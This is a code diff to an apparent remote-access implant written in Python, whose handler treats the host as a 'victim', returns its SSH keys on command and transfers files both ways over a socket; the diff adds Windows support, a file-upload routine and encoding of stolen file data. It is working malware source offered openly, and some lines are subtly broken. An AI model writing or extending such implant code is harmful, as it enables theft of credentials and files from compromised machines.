@@ -1,8 +1,10 @@
+import os
 import platform
 import SocketServer
 import sys
 
 from crispy.os_types.macintosh import Mac
+from crispy.os_types.windows import Windows
 from crispy.encoders.mime import Mime
 
 class ImplantHandler(SocketServer.BaseRequestHandler):
@@ -11,9 +13,9 @@ class ImplantHandler(SocketServer.BaseRequestHandler):
         if platform.system() == 'Darwin':
             victim = Mac()
         elif platform.system() == 'Windows':
-            pass
+            victim = Windows()
         else:
-            pass
+            self.request.sendall("Unknown OS: " + platform.system + ". Please proceed with caution.")
 
         while True:
             try:
@@ -32,24 +34,42 @@ class ImplantHandler(SocketServer.BaseRequestHandler):
                 elif cmd == "get_ssh_keys":
                     self.request.sendall(cipher.encode(victim.get_ssh_keys()))
                 elif cmd.startswith('upload') == True:
-                    #files = command[7:].split(' ')
-                    pass
-                elif cmd.startswith('download') == True:
-                    upFile = cmd[9:].split(' ')[0]
+                    saveMeFile = cmd[7:].split(' ')[1]
                     
-                    f = open(upFile, 'rb')
+                    if os.path.isfile(saveMeFile):
+                        break 
+                    else:   
+                        try:
+                            f = open(saveMeFile, 'wb')
+                            while True:
+                                data = cipher.decode(self.request.recv(1024))
+                                 
+                                if not data:
+                                    break
+                                elif data == "EOF!EOF!": 
+                                    f.write(data[:-8])
+                                    break
+                                else:
+                                    f.write(data)
+                            f.close()
+                        except: 
+                            pass     
+                elif cmd.startswith('download') == True:
+                    sendMeFile = cmd[9:].split(' ')[0]
+                    
+                    f = open(sendMeFile, 'rb')
                     while True:
                         data = f.read(1024)
 
                         if not data:
                             break
                         else:
-                            self.request.sendall(data) 
+                            self.request.sendall(cipher.encode(data)) 
                     f.close()
                     self.request.sendall("EOF!EOF!") 
                 else:
                     self.request.sendall(cipher.encode("unknown command\n"))
-            except:
+            except: 
                 server.close_request(self.request)
                 sys.exit(1)                            
         
